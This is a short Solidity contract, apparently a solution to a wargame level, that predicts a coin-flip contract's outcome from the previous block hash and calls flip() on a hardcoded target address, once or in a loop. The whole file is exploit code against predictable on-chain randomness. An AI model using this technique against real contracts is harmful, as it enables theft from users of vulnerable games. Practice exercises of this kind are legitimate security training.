pragma solidity ^0.8;

contract AttackCoinFlip {


    function attack() external {
        bool guess = calculateGuess();
        address target = 0x856e4424f806D16E8CBC702B3c0F2ede5468eae5;
        target.call(abi.encodeWithSignature("flip(bool)", guess));
    }

    function multipleAttacks() external {
        bool guess = calculateGuess();
        address target = 0x856e4424f806D16E8CBC702B3c0F2ede5468eae5;
        for(uint8 i = 0; i<10;i++) {
            target.call(abi.encodeWithSignature("flip(bool)", guess));
        }
    }

    function calculateGuess() private returns(bool) {
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        uint256 lastHash;
        uint256 blockValue = uint256(blockhash(block.number-1));

        if (lastHash == blockValue) {
          revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue/FACTOR;
        bool side = coinFlip == 1 ? true : false;

        return side;
        }
}